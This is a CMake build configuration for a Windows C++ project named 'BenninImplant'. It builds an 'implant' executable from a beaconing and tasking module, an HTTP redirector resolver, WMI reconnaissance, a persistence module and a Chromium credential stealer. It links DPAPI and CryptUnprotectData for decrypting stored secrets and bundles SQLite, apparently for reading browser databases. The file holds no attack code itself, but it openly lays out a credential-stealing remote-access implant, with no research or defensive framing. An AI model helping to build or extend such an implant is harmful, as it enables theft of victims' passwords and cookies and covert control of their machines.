cmake_minimum_required(VERSION 3.20)
project(BenninImplant LANGUAGES CXX C)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin)

# MSVC-specific warnings and defs (adapt for MinGW if needed)
if(MSVC)
    add_compile_options(/W4 /WX /permissive-)
    add_definitions(-D_CRT_SECURE_NO_WARNINGS -DUNICODE -D_UNICODE)
else()
    add_compile_options(-Wall -Wextra -Wpedantic -Werror)
endif()

# Add SQLite as a static library (compile from source for embedding)
add_library(sqlite STATIC external/sqlite/sqlite3.c)
set_target_properties(sqlite PROPERTIES LINKER_LANGUAGE C)
target_compile_options(sqlite PRIVATE -fPIC -w)
target_include_directories(sqlite PUBLIC external/sqlite)

# Main executable
add_executable(implant
    src/main.cpp
    src/core/ImplantId.cpp
    src/crypto/AesGcm.cpp
    src/crypto/Dpapi.cpp
    src/http/WinHttpClient.cpp
    src/http/RedirectorResolver.cpp
    src/beacon/Beacon.cpp
    src/beacon/TaskDispatcher.cpp
    src/recon/WmiHelpers.cpp
    src/recon/SysInfo.cpp
    src/persistence/Persistence.cpp
    src/credential/ChromiumStealer.cpp
)

# Include dirs: src as base for all custom headers, external for nlohmann/json and sqlite
target_include_directories(implant PRIVATE
    ${PROJECT_SOURCE_DIR}/src
    ${PROJECT_SOURCE_DIR}/external
    ${PROJECT_SOURCE_DIR}/external/nlohmann
)

# Link libs
target_link_libraries(implant PRIVATE
    sqlite  # Link static SQLite
    winhttp
    bcrypt
    rpcrt4
    ole32
    uuid
    # Add more as needed, e.g., advapi32 for DPAPI, crypt32
    advapi32
    crypt32  # For CryptUnprotectData in DPAPI
    wbemuuid  # For WMI
)

# For MinGW cross-compile, ensure static linking if desired
if(MINGW)
    target_link_options(implant PRIVATE -static-libgcc -static-libstdc++)
endif()
